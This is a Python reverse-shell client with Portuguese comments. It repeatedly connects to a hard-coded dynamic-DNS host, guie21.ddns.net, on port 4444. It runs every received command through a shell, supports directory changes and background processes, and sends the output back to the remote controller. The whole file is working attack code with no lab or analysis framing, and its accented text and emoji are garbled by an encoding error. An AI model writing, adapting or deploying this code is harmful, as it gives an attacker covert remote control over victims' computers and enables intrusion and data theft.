
import socket
import subprocess
import os
import time
import re

# Configura√ß√£o do servidor
SERVER_HOSTNAME = 'guie21.ddns.net'  # Pode ser um IP ou um DNS
SERVER_PORT = 4444

# Express√£o regular para verificar se √© um IP (ex: 192.168.1.1)
IP_REGEX = re.compile(r"^\d{1,3}(\.\d{1,3}){3}$")

# Fun√ß√£o para detectar se √© IP ou DNS e resolver caso necess√°rio
def obter_ip(servidor):
    if IP_REGEX.match(servidor):  # Se j√° for IP, retorna como est√°
        return servidor
    try:
        ip_resolvido = socket.gethostbyname(servidor)
        print(f"üîç Resolvendo {servidor} para {ip_resolvido}...")
        return ip_resolvido
    except socket.gaierror:
        print("‚ùå Falha ao resolver o dom√≠nio.")
        return None

# Fun√ß√£o para tentar se conectar continuamente at√© conseguir
def conectar_ao_servidor():
    while True:
        ip = obter_ip(SERVER_HOSTNAME)
        if not ip:
            time.sleep(5)
            continue
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, SERVER_PORT))
            print(f"‚úÖ Conectado ao servidor em {ip}:{SERVER_PORT}")
            return s
        except:
            print(f"‚è≥ Tentando se conectar ao {ip}:{SERVER_PORT}...")
            time.sleep(5)

# Conectar ao servidor
socket_cliente = conectar_ao_servidor()

while True:
    try:
        comando = socket_cliente.recv(1024).decode().strip()
        if comando.lower() == 'exit':
            break

        # Comando para mudar de diret√≥rio
        if comando.startswith("cd "):
            try:
                caminho = comando[3:].strip()
                os.chdir(caminho)
                socket_cliente.send(f"üìÅ Diret√≥rio alterado para: {os.getcwd()}\n".encode())
            except FileNotFoundError:
                socket_cliente.send("‚ùå Diret√≥rio n√£o encontrado.\n".encode())
        # Comandos que abrem janelas, como 'start cmd'
        elif comando.lower().startswith("start"):
            subprocess.Popen(comando, shell=True)
            socket_cliente.send("‚úÖ Comando iniciado em segundo plano.\n".encode())
        # Comandos normais com sa√≠da
        else:
            resultado = subprocess.run(comando, shell=True, capture_output=True, text=True)
            saida = resultado.stdout + resultado.stderr
            if not saida:
                saida = "‚úÖ Comando executado.\n"
            socket_cliente.send(saida.encode())

    except Exception as e:
        erro = f"[ERRO] {str(e)}\n"
        try:
            socket_cliente.send(erro.encode())
        except:
            print("üîÑ Conex√£o perdida! Tentando reconectar...")
            socket_cliente = conectar_ao_servidor()

# Fechar conex√£o
socket_cliente.close()
